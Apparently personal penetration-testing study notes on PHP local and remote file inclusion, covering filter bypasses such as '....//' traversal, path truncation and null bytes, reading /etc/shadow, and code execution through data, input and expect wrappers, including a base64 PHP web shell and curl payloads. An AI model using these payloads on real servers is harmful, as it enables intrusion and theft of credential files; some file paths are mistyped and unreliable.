Navigation: [[Pentesting]]

---
# Table of Contents
1. Introduction
2. Local File Inclusion
3. Finding RCE
4. Remote File Inclusion
5. Automated Scanning
6. Prevention
# Introduction
Lots of backend languages use HTTP parameters to specify what's being shown on the page. This allows for building more dynamic pages, reduces script sizes, and simplifies code.

However, these parameters need to be filtered properly, otherwise they can lead to file inclusion vulnerabilities. This allows an attacker to read or execute files on the server by bypassing filters.

There are two types of file inclusion: local and remote. These names are specified by where the files are contained: local being on the server, and remote being remotely referenced scripts.
# Local File Inclusion
Let's start with an example. Take a look at this URI:
```http
http://<IP>:<PORT>/index.php?lang=es.php
```

From what we can see, we're loading the page `es.php` from our server. If there were no filters, we can change `es.php` to `/etc/shadow` and display that. We're also free to traverse paths if it isn't blocked by the filter.
### Common Filters
**Filename Prefix**
The PHP code would look like this:
```php
include("lang_" . $_GET['language']);
```

Meaning we'd be accessing:
```http
/lang_esp.php
```

Regardless, we'll just include this as a prefix:
```http
/lang_/etc/password
```

**Non-Recursive Path Traversal**
Code:
```PHP
$language = str_replace('../', '', $_GET['language']);
```

Exploit:
```shell
....//
# Server recognizes this as ../
```

**Special Character Filter**
Some web filters remove special characters. We can bypass this using URL encoding.

**Appended Extension**
Some filters require an extension at the end of our files, such as `.php`. There are two bypasses for this:

Path truncation, where we can just extend our path beyond the maximum checked length. Older versions of PHP have a 4096 character path limit, so we can simply have:
```shell
/etc/passwd/././././././././././... # Repeated to 4096 chars
```

With null byte injection, PHP would terminate a string after a null byte. Therefore our payload can look like:
```shell
/etc/passd%00.php
```
# Finding RCE
### PHP Wrappers
We can check the PHP config file found at `/etc/php/X.Y/apache2/php.ini`. Search for a `base64` string and decode it, this contains our configs. 

We'll need `allow_url_include = On` to be enabled for RCE through the data and input wrappers. The expect wrapper relies on `extension=expect` to be set.

**Data Wrapper**
Used to allow external data including PHP code. It can also be passed `base64` code with `text/plain'base64`, and can decode then execute the PHP code. 

Here's a simple way we can send a payload:
```http
data://text/plain;base64, <PHP webshell> &cmd<cmd>
```

Here's the web shell used:
```shell
echo '<?php system($_GET["cmd"]); ?>' | base64

PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

**Input Wrapper**
Similar to the data wrapper, just we POST the data:
```shell
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"
```

**Include Wrapper**
Allows commands to directly be run through URL streams. It's an external wrapper, so it needs to be manually installed and enabled. 

Example usage:
```shell
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
```
# Remote File Inclusion
With RFI, we're essentially just going to host a file server and have the web server grab a file off of us. Nothing else to really include here. You might have to play around with the protocol though.
# Automated Scanning
# Prevention


---
Navigation: [[Pentesting]]